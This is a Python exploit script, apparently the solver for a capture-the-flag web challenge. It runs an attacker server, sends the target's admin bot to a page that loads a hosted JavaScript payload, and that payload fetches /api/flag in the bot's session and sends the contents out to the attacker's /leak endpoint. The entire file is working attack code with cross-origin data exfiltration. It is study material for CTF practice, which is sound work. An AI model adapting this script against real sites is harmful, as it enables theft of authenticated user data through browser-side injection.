#!/usr/bin/env python3
import json
import os
import queue
import sys
import threading
import urllib.error
import urllib.parse
import urllib.request
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from pathlib import Path


ROOT = Path(__file__).resolve().parent
TIMEOUT = 35
result = queue.Queue(maxsize=1)


def fail(message):
    sys.stderr.write(message + "\n")
    raise SystemExit(1)


def load_target():
    data = json.loads((ROOT / "instance.json").read_text(encoding="utf-8"))
    endpoints = data.get("endpoints", [])
    if not endpoints or not endpoints[0].get("url"):
        fail("instance.json does not contain a target URL")
    return endpoints[0]["url"].rstrip("/")


TARGET = load_target()
PUBLIC_URL = os.environ.get("READONCE_PUBLIC_URL", "").rstrip("/")
try:
    LISTEN_PORT = int(os.environ.get("READONCE_LISTEN_PORT", "8000"))
except ValueError:
    fail("READONCE_LISTEN_PORT must be an integer")

if not PUBLIC_URL.startswith(("http://", "https://")):
    fail("set READONCE_PUBLIC_URL to the public URL forwarding to this host")


class ExploitHandler(BaseHTTPRequestHandler):
    def log_message(self, *_args):
        pass

    def send_bytes(self, status, body=b"", content_type="text/plain; charset=utf-8", headers=None):
        self.send_response(status)
        self.send_header("Content-Type", content_type)
        self.send_header("Content-Length", str(len(body)))
        for name, value in (headers or {}).items():
            self.send_header(name, value)
        self.end_headers()
        self.wfile.write(body)

    def do_GET(self):
        url = urllib.parse.urlsplit(self.path)
        params = urllib.parse.parse_qs(url.query)

        if url.path == "/start":
            rid = params.get("rid", [""])[0]
            if not rid:
                self.send_bytes(400, b"missing rid")
                return

            review = TARGET + "/review?" + urllib.parse.urlencode({
                "rid": rid,
                "u": PUBLIC_URL + "/payload.js",
            })
            try:
                with urllib.request.urlopen(review, timeout=10) as response:
                    if response.status != 200:
                        raise RuntimeError(f"review returned HTTP {response.status}")
            except Exception as exc:
                if result.empty():
                    result.put(exc)
                self.send_bytes(502, b"review setup failed")
                return

            location = "http://localhost:3000/sandbox?" + urllib.parse.urlencode({"rid": rid})
            self.send_bytes(302, headers={"Location": location})
            return

        if url.path == "/payload.js":
            leak_prefix = json.dumps(PUBLIC_URL + "/leak?data=")
            script = (
                "const f=document.createElement('form');"
                "f.method='GET';f.action='/api/flag';f.target='flagwin';"
                "document.body.appendChild(f);f.submit();"
                "setTimeout(()=>{const w=open('','flagwin');"
                f"location={leak_prefix}+encodeURIComponent(w.document.body.innerText);"
                "},500);"
            ).encode()
            self.send_bytes(200, script, "application/javascript; charset=utf-8")
            return

        if url.path == "/leak":
            raw = params.get("data", [""])[0]
            try:
                flag = json.loads(raw)["flag"]
                if not isinstance(flag, str) or not flag.startswith("pwnsec{"):
                    raise ValueError("invalid flag response")
                if result.empty():
                    result.put(flag)
                self.send_bytes(200, b"ok")
            except Exception as exc:
                if result.empty():
                    result.put(exc)
                self.send_bytes(400, b"invalid leak")
            return

        self.send_bytes(200, b"ok")


def submit_report():
    body = urllib.parse.urlencode({"url": PUBLIC_URL + "/start"}).encode()
    request = urllib.request.Request(TARGET + "/report", data=body, method="POST")
    try:
        urllib.request.urlopen(request, timeout=TIMEOUT).read()
    except Exception as exc:
        if result.empty():
            result.put(exc)


def main():
    try:
        server = ThreadingHTTPServer(("0.0.0.0", LISTEN_PORT), ExploitHandler)
    except OSError as exc:
        fail(f"cannot listen on port {LISTEN_PORT}: {exc}")

    server_thread = threading.Thread(target=server.serve_forever, daemon=True)
    server_thread.start()
    threading.Thread(target=submit_report, daemon=True).start()

    try:
        value = result.get(timeout=TIMEOUT)
    except queue.Empty:
        server.shutdown()
        fail("timed out waiting for the admin bot")
    server.shutdown()

    if isinstance(value, Exception):
        fail(f"exploit failed: {value}")
    sys.stdout.buffer.write(value.encode("utf-8"))


if __name__ == "__main__":
    main()
